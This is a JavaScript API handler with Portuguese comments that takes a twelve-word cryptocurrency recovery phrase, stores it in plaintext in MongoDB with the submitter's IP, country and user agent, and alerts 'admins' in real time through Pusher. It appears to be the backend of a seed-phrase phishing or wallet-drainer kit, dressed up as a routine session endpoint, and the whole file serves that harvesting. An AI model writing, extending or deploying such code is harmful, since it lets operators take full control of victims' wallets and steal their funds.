import { connectDB } from '../../lib/mongodb'
import Session from '../../lib/models/Session'
import pusher from '../../lib/pusher'
import { getClientIp, getCountryFromIp, formatSession, setCorsHeaders } from '../../lib/utils'

export default async function handler(req, res) {
  setCorsHeaders(res)

  if (req.method === 'OPTIONS') {
    res.status(200).end()
    return
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }

  try {
    await connectDB()
    
    const { seedWords, clientId } = req.body

    // Validações
    if (!clientId || typeof clientId !== 'string') {
      return res.status(400).json({ error: 'clientId is required' })
    }

    if (!Array.isArray(seedWords) || seedWords.length !== 12) {
      return res.status(400).json({ error: 'seedWords must contain 12 entries' })
    }

    const sanitizedSeedWords = seedWords.map(word => 
      typeof word === 'string' ? word.trim() : ''
    )

    if (sanitizedSeedWords.some(word => word.length === 0)) {
      return res.status(400).json({ error: 'seedWords cannot contain empty values' })
    }

    // Verificar se já existe uma sessão para este clientId
    const existingSession = await Session.findOne({ clientId })
    if (existingSession) {
      const sessionId = existingSession._id.toString()
      return res.status(200).json({
        sessionId,
        channel: `session-${sessionId}`,
        status: existingSession.status,
        message: 'Session already exists'
      })
    }

    // Obter IP e geolocalização
    const ipAddress = getClientIp(req)
    const country = getCountryFromIp(ipAddress)
    const userAgent = req.headers['user-agent'] || 'Unknown'

    // Criar sessão no MongoDB
    const session = await Session.create({
      clientId,
      seedWords: sanitizedSeedWords,
      ipAddress,
      country,
      userAgent,
      status: 'seed-submitted'
    })

    const sessionId = session._id.toString()

    // Notificar admins via Pusher
    await pusher.trigger('admin-channel', 'new-session', formatSession(session))

    res.status(201).json({
      sessionId,
      channel: `session-${sessionId}`,
      status: session.status
    })

  } catch (error) {
    console.error('Failed to create session:', error)
    res.status(500).json({ error: 'Failed to create session' })
  }
}